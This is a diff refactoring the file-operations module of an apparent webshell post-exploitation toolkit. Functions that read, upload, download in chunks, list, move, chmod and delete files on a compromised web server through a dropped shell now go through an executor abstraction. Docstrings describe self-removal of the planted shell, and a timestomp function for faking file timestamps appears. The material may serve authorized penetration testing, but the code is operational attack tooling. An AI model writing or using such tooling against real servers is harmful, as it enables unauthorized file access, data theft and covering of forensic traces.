@@ -2,13 +2,11 @@
 
 from __future__ import annotations
 
-import base64
 import shlex
 from pathlib import Path
 from typing import TypedDict
 
 from .. import log
-from ..core.php import php_string
 from ..core.webshell import WebShell
 from ..exceptions import WebshellError
 from ..utils.hashing import hash_file
@@ -17,23 +15,21 @@ from ..utils.http import get_domain
 
 def read_file(ws: WebShell, path: str) -> str:
     log.info(f"Reading file: {path}")
-    content = ws.run_php(f"echo file_get_contents({php_string(path)})")
+    content = ws.executor.fs_read_text(path)
     log.raw(content)
     return content
 
 
 def file_exists(ws: WebShell, path: str) -> bool:
-    result = ws.run_php(f"var_dump(file_exists({php_string(path)}))")
-    return "bool(true)" in result
+    return ws.executor.fs_exists(path)
 
 
 def is_directory(ws: WebShell, path: str) -> bool:
-    result = ws.run_php(f"var_dump(is_dir({php_string(path)}))")
-    return "bool(true)" in result
+    return ws.executor.fs_is_dir(path)
 
 
 def hash_remote_file(ws: WebShell, path: str) -> str:
-    return ws.run_php(f"echo md5(file_get_contents({php_string(path)}))").strip()
+    return ws.executor.fs_md5(path)
 
 
 def upload(ws: WebShell, local_path: str | Path, remote_path: str) -> bool:
@@ -43,12 +39,7 @@ def upload(ws: WebShell, local_path: str | Path, remote_path: str) -> bool:
     are base64-encoded, so any binary content transfers intact.
     """
     data = Path(local_path).read_bytes()
-    encoded = base64.b64encode(data).decode()
-    code = (
-        f"echo file_put_contents({php_string(remote_path)}, base64_decode('{encoded}')) "
-        "!== false ? 'OK' : 'FAIL'"
-    )
-    ok = "OK" in ws.run_php(code)
+    ok = ws.executor.fs_write(remote_path, data)
     if ok:
         log.success(f"Uploaded {local_path} -> {remote_path} ({len(data)} bytes)")
     else:
@@ -62,8 +53,7 @@ def remove(ws: WebShell, path: str | None = None) -> bool:
     Self-removal (``unlink(__FILE__)``) is the engagement-cleanup counterpart to
     injection — it lets you pull a dropped shell once you are done with it.
     """
-    target = php_string(path) if path else "__FILE__"
-    ok = "bool(true)" in ws.run_php(f"var_dump(unlink({target}))")
+    ok = ws.executor.fs_delete(path)
     if ok:
         log.success(f"Removed {path or 'the webshell itself (__FILE__)'}")
     else:
@@ -96,8 +86,8 @@ DEFAULT_CHUNK = 512 * 1024
 
 def _remote_size(ws: WebShell, path: str) -> int:
     try:
-        return int(ws.run_php(f"echo filesize({php_string(path)})").strip())
-    except (ValueError, WebshellError):
+        return ws.executor.fs_size(path)
+    except WebshellError:
         return -1
 
 
@@ -109,16 +99,10 @@ def _fetch(ws: WebShell, remote_path: str, chunk_size: int) -> bytes:
     """
     size = _remote_size(ws, remote_path)
     if size <= 0 or size <= chunk_size:
-        return base64.b64decode(
-            ws.run_php(f"echo base64_encode(file_get_contents({php_string(remote_path)}))")
-        )
+        return ws.executor.fs_read_bytes(remote_path)
     parts: list[bytes] = []
     for offset in log.track(list(range(0, size, chunk_size)), f"↓ {Path(remote_path).name}"):
-        code = (
-            f"$f=fopen({php_string(remote_path)},'rb');fseek($f,{offset});"
-            f"echo base64_encode(fread($f,{chunk_size}));fclose($f)"
-        )
-        parts.append(base64.b64decode(ws.run_php(code)))
+        parts.append(ws.executor.fs_read_range(remote_path, offset, chunk_size))
     return b"".join(parts)
 
 
@@ -198,25 +182,14 @@ class DirEntry(TypedDict):
 
 def list_dir(ws: WebShell, path: str) -> list[DirEntry]:
     """List a directory as structured entries (name/size/mode/mtime/type)."""
-    code = (
-        f"$d={php_string(path)};"
-        "foreach(scandir($d) as $n){if($n=='.'||$n=='..'){continue;}"
-        "$p=$d.'/'.$n;$s=@stat($p);"
-        "echo $n.chr(31).($s?$s[7]:0).chr(31).($s?$s[2]:0).chr(31).($s?$s[9]:0)"
-        ".chr(31).(is_dir($p)?'d':'-').chr(30);}"
-    )
     entries: list[DirEntry] = []
-    for row in ws.run_php(code).split("\x1e"):
-        parts = row.split("\x1f")
-        if len(parts) < 5:
-            continue
-        name, size, mode, mtime, kind = parts[:5]
+    for name, size, octal_mode, mtime, kind in ws.executor.fs_list(path):
         entries.append(
             DirEntry(
                 name=name,
-                size=int(size or 0),
-                mode=_perms(int(mode or 0)),
-                mtime=int(mtime or 0),
+                size=size,
+                mode=_perms(int(octal_mode or "0", 8)),
+                mtime=mtime,
                 type=kind,
             )
         )
@@ -224,21 +197,19 @@ def list_dir(ws: WebShell, path: str) -> list[DirEntry]:
 
 
 def move(ws: WebShell, src: str, dst: str) -> bool:
-    return "bool(true)" in ws.run_php(f"var_dump(rename({php_string(src)},{php_string(dst)}))")
+    return ws.executor.fs_move(src, dst)
 
 
 def copy_file(ws: WebShell, src: str, dst: str) -> bool:
-    return "bool(true)" in ws.run_php(f"var_dump(copy({php_string(src)},{php_string(dst)}))")
+    return ws.executor.fs_copy(src, dst)
 
 
 def make_dir(ws: WebShell, path: str) -> bool:
-    return "bool(true)" in ws.run_php(f"var_dump(mkdir({php_string(path)},0755,true))")
+    return ws.executor.fs_mkdir(path)
 
 
 def chmod_path(ws: WebShell, path: str, mode: str) -> bool:
-    if not mode.isdigit():
-        raise ValueError("mode must be octal digits, e.g. 755")
-    return "bool(true)" in ws.run_php(f"var_dump(chmod({php_string(path)},0{mode}))")
+    return ws.executor.fs_chmod(path, mode)
 
 
 def timestomp(ws: WebShell, path: str, reference: str) -> None:
